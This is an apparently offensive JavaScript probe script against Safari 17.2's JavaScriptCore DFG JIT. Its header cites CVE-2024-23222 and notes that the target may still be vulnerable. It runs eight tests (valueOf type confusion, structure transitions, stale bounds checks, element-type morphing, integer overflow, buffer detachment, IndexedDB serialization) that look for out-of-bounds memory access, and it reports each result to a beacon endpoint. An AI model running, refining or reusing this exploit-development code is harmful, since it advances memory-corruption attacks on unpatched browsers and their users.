/* p88-dfg — DFG JIT type confusion + speculation bypass
 *
 * CVE-2024-23222: DFG type confusion, fixed Safari 17.3.
 * WE ARE ON SAFARI 17.2. This CVE may be LIVE.
 *
 * DFG compiles functions based on observed types. If we can
 * trick DFG into not deoptimizing on a type change:
 * - Int32 → Object (valueOf callback during arithmetic)
 * - Structure transition during property access
 * - Bounds check elimination with stale length
 * - Argument speculation bypass
 *
 * These give OOB read/write OUTSIDE Gigacage (in JIT-compiled
 * native code, not JS-level buffer access).
 *
 * Beacon prefix: V88D-
 */
(function(){
"use strict";
var RUN_ID = "v88d" + Math.random().toString(36).slice(2,12);
var PREFIX = "V88D-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press88-dfg-jit");

/* ====== D1: Int32 → Object valueOf during JIT arithmetic ====== */
function test_D1() {
  var r = {};
  try {
    // DFG compiles add(x) assuming x is always Int32
    function add(x) { return x + 1; }

    // Warm with integers — DFG speculates Int32
    for (var i = 0; i < 150000; i++) add(i | 0);
    r.warmOK = true;

    // Now pass object with valueOf — DFG should deoptimize
    var callbackFired = false;
    var evil = {
      valueOf: function() {
        callbackFired = true;
        return 42;
      }
    };

    var result = add(evil);
    r.result = result; // should be 43
    r.callbackFired = callbackFired;
    r.DEOPT_OK = callbackFired && result === 43;

    // Deeper: chain valueOf with side effects
    var sideEffects = [];
    var evil2 = {
      valueOf: function() {
        sideEffects.push("valueOf");
        // During valueOf, can we corrupt JIT state?
        // Try to trigger GC
        var garbage = [];
        for (var g = 0; g < 1000; g++) garbage.push(new ArrayBuffer(1024));
        return 0x41414141;
      }
    };

    var result2 = add(evil2);
    r.result2 = result2;
    r.result2Hex = (result2 >>> 0).toString(16);
    r.sideEffects = sideEffects.length;

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D1-VALUEOF", r);
}

/* ====== D2: DFG property access + structure transition ====== */
function test_D2() {
  var r = {};
  try {
    // DFG caches object structure for property access
    // If structure changes between two accesses in same function...
    function readAB(obj) {
      var a = obj.a;
      var b = obj.b;
      return a + b;
    }

    // Warm with consistent structure
    function makeObj() { return { a: 1, b: 2 }; }
    for (var i = 0; i < 150000; i++) readAB(makeObj());
    r.warmOK = true;

    // Now pass object where 'a' getter changes structure before 'b' read
    var transitioning = {};
    var transitionCount = 0;
    Object.defineProperty(transitioning, 'a', {
      get: function() {
        transitionCount++;
        // Delete 'b' and redefine it at different offset
        delete transitioning.b;
        transitioning.c = 999; // add property → structure transition
        transitioning.b = 777; // re-add 'b' → now at different offset
        return 111;
      }, configurable: true
    });
    transitioning.b = 222;

    var result = readAB(transitioning);
    r.result = result; // should be 111 + 777 = 888
    r.transitionCount = transitionCount;
    r.STRUCT_CONFUSED = result !== 888 && result !== 333;

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D2-STRUCT-TRANS", r);
}

/* ====== D3: DFG array bounds check elimination ====== */
function test_D3() {
  var r = {};
  try {
    // DFG can eliminate bounds checks when it proves index < length
    // If we can change length AFTER the proof but BEFORE the access...
    function accessLast(arr) {
      var len = arr.length;
      if (len > 0) {
        // DFG proves (len-1) < len, might skip bounds check
        return arr[len - 1];
      }
      return -1;
    }

    // Warm with regular arrays
    for (var i = 0; i < 150000; i++) {
      accessLast([1, 2, 3, 4, 5]);
    }
    r.warmOK = true;

    // Test 1: RAB-backed view — length auto-tracks
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var view = new Uint8Array(rab);
    for (var j = 0; j < 256; j++) view[j] = j;

    var result1 = accessLast(view);
    r.rabResult = result1; // should be 255

    // Test 2: Proxy array with mutable length
    var proxyLength = 100;
    var backing = new Uint8Array(100);
    for (var k = 0; k < 100; k++) backing[k] = k;

    var proxy = new Proxy(backing, {
      get: function(target, prop) {
        if (prop === 'length') {
          var l = proxyLength;
          proxyLength = 5; // shrink after length read!
          return l;
        }
        return target[prop];
      }
    });

    var result2 = accessLast(proxy);
    r.proxyResult = result2; // DFG used len=100, but actual length is now 5
    // If DFG used stale length → arr[99] on 5-element array → OOB!
    r.BOUNDS_CONFUSED = result2 === backing[99]; // should be 99 if no confusion

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D3-BOUNDS", r);
}

/* ====== D4: DFG speculation on array element type ====== */
function test_D4() {
  var r = {};
  try {
    // DFG speculates on array indexing type (contiguous, int32, double, etc)
    function sumArray(arr) {
      var s = 0;
      for (var i = 0; i < arr.length; i++) s += arr[i];
      return s;
    }

    // Warm with Int32 array
    var intArr = new Array(100);
    for (var i = 0; i < 100; i++) intArr[i] = i;
    for (var w = 0; w < 100000; w++) sumArray(intArr);
    r.warmOK = true;

    // Now feed it a sparse array (different internal representation)
    var sparse = [];
    sparse[0] = 1;
    sparse[999999] = 2; // creates sparse array
    try {
      var result1 = sumArray(sparse);
      r.sparseResult = result1;
      r.sparseOK = true;
    } catch(e) {
      r.sparseErr = e.message.slice(0,40);
    }

    // Feed it array with holes
    var holey = [1, , 3, , 5]; // holes
    var result2 = sumArray(holey);
    r.holeyResult = result2; // NaN from undefined + number
    r.holeyIsNaN = isNaN(result2);

    // Feed it array where elements change type mid-iteration
    var morphing = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    Object.defineProperty(morphing, '5', {
      get: function() {
        // Convert remaining elements to strings during iteration
        morphing[6] = "evil";
        morphing[7] = { valueOf: function() { return 0x41414141; } };
        return 6;
      }
    });

    var result3 = sumArray(morphing);
    r.morphResult = result3;
    r.morphType = typeof result3; // might be string from concatenation
    r.MORPH_CONFUSED = typeof result3 === "string";

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D4-ELEM-TYPE", r);
}

/* ====== D5: DFG inlining + argument speculation ====== */
function test_D5() {
  var r = {};
  try {
    // DFG inlines small functions and speculates on argument types
    function inner(x) { return x | 0; } // force Int32
    function outer(a, b) { return inner(a) + inner(b); }

    // Warm with integers
    for (var i = 0; i < 200000; i++) outer(i, i + 1);
    r.warmOK = true;

    // Pass values that look like integers but aren't
    var result1 = outer(2147483647, 1); // INT32_MAX + 1 → overflow
    r.overflow = result1;
    r.overflowHex = (result1 >>> 0).toString(16);

    var result2 = outer(-2147483648, -1); // INT32_MIN - 1
    r.underflow = result2;

    // Pass NaN
    var result3 = outer(NaN, 1);
    r.nanResult = result3;

    // Pass Infinity
    var result4 = outer(Infinity, 1);
    r.infResult = result4;

    // Pass object that triggers valueOf during bitwise OR
    var result5 = outer({
      valueOf: function() {
        // Can we corrupt the stack here?
        return 0xDEADBEEF;
      }
    }, 1);
    r.objResult = result5;
    r.objHex = (result5 >>> 0).toString(16);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D5-INLINE-SPEC", r);
}

/* ====== D6: DFG with TypedArray + detach during JIT callback ====== */
function test_D6() {
  var r = {};
  try {
    // Warm a function that reads from TypedArray
    var buf = new ArrayBuffer(1024);
    var arr = new Float64Array(buf);
    for (var i = 0; i < 128; i++) arr[i] = i + 0.5;

    function readF64(a, idx) { return a[idx]; }

    // Warm DFG with valid reads
    for (var w = 0; w < 200000; w++) readF64(arr, w % 128);
    r.warmOK = true;

    // Now detach the buffer and read
    try { structuredClone(buf, { transfer: [buf] }); } catch(e) {}
    r.detached = buf.byteLength === 0;

    var result = readF64(arr, 0);
    r.afterDetach = result;
    r.isUndef = result === undefined;
    r.isNaN2 = typeof result === 'number' && isNaN(result);
    // If DFG didn't check detachment → might read freed memory
    r.STALE_READ = typeof result === 'number' && !isNaN(result) && result !== undefined;

    // Also: read with increasingly large index
    var oobResults = [];
    for (var idx = 0; idx < 10; idx++) {
      var v = readF64(arr, idx);
      oobResults.push(typeof v + ":" + v);
    }
    r.oobSample = oobResults.slice(0, 5).join("|");

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D6-DETACH-JIT", r);
}

/* ====== D7: DFG comparison optimization — integer overflow ====== */
function test_D7() {
  var r = {};
  try {
    // DFG optimizes comparisons. Integer overflow in comparison might
    // lead to incorrect branch, skipping bounds checks.
    function checkBounds(arr, idx) {
      if (idx >= 0 && idx < arr.length) {
        return arr[idx];
      }
      return -1;
    }

    var testArr = new Uint8Array(256);
    for (var i = 0; i < 256; i++) testArr[i] = i;

    // Warm
    for (var w = 0; w < 200000; w++) checkBounds(testArr, w % 256);
    r.warmOK = true;

    // Test with edge values
    r.neg1 = checkBounds(testArr, -1); // should be -1
    r.at0 = checkBounds(testArr, 0); // should be 0
    r.at255 = checkBounds(testArr, 255); // should be 255
    r.at256 = checkBounds(testArr, 256); // should be -1

    // Integer overflow: 0x80000000 (negative as int32, positive as uint32)
    r.intOverflow = checkBounds(testArr, 0x80000000);
    r.negOverflow = checkBounds(testArr, -0x80000000);

    // Very large positive
    r.huge = checkBounds(testArr, 0x7FFFFFFF);

    // NaN (comparison with NaN is always false)
    r.nan = checkBounds(testArr, NaN);

    // The critical test: can we make DFG think index is in-bounds
    // when it's actually out-of-bounds?
    // Use floating point that rounds to in-bounds for the check
    // but produces OOB for the actual access
    r.floatEdge = checkBounds(testArr, 255.9999999999999);
    r.floatOOB = checkBounds(testArr, 256.0000000000001);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("D7-CMP-OVERFLOW", r);
}

/* ====== D8: IndexedDB — different structuredClone path ====== */
function test_D8() {
  var r = {};
  try {
    r.hasIDB = typeof indexedDB !== 'undefined';
    if (!r.hasIDB) { B("D8-IDB", r); return; }

    var req = indexedDB.open("test88-" + RUN_ID, 1);
    req.onupgradeneeded = function(e) {
      var db = e.target.result;
      db.createObjectStore("test", { keyPath: "id" });
    };
    req.onsuccess = function(e) {
      var db = e.target.result;

      // Store object with ArrayBuffer
      var ab = new ArrayBuffer(256);
      new Uint8Array(ab).fill(0xBB);

      var tx = db.transaction("test", "readwrite");
      var store = tx.objectStore("test");

      // Put object with getter that modifies buffer
      var obj = { id: 1 };
      obj.buf = ab;
      Object.defineProperty(obj, 'trigger', {
        enumerable: true,
        get: function() {
          // Modify buffer during IDB serialization
          new Uint8Array(ab).fill(0xCC);
          return "triggered";
        }
      });

      try {
        store.put(obj);
      } catch(err) {
        r.putErr = err.message.slice(0,40);
      }

      tx.oncomplete = function() {
        // Read it back
        var tx2 = db.transaction("test", "readonly");
        var store2 = tx2.objectStore("test");
        var getReq = store2.get(1);
        getReq.onsuccess = function(e2) {
          var result = e2.target.result;
          if (result && result.buf instanceof ArrayBuffer) {
            var cv = new Uint8Array(result.buf);
            r.idbBufLen = result.buf.byteLength;
            r.idbByte0 = cv[0]; // 0xBB=before getter, 0xCC=after getter
            r.IDB_TIMING = cv[0] === 0xBB ? "BEFORE" : "AFTER";
          }
          r.hasTrigger = 'trigger' in result;
          db.close();
          indexedDB.deleteDatabase("test88-" + RUN_ID);
          B("D8-IDB", r);
        };
      };

      tx.onerror = function(err) {
        r.txErr = err.target.error ? err.target.error.message.slice(0,40) : "unknown";
        db.close();
        B("D8-IDB", r);
      };
    };
    req.onerror = function(e) {
      r.idbErr = e.target.error ? e.target.error.message.slice(0,40) : "unknown";
      B("D8-IDB", r);
    };

  } catch(e) { r.err = e.message.slice(0,80); B("D8-IDB", r); }
}

/* ====== Run ====== */
try {
  test_D1();
  setTimeout(test_D2, 300);
  setTimeout(test_D3, 700);
  setTimeout(test_D4, 1200);
  setTimeout(test_D5, 1800);
  setTimeout(test_D6, 2400);
  setTimeout(test_D7, 3000);
  setTimeout(test_D8, 3500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 3000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe88-done"); }, 22000);
})();
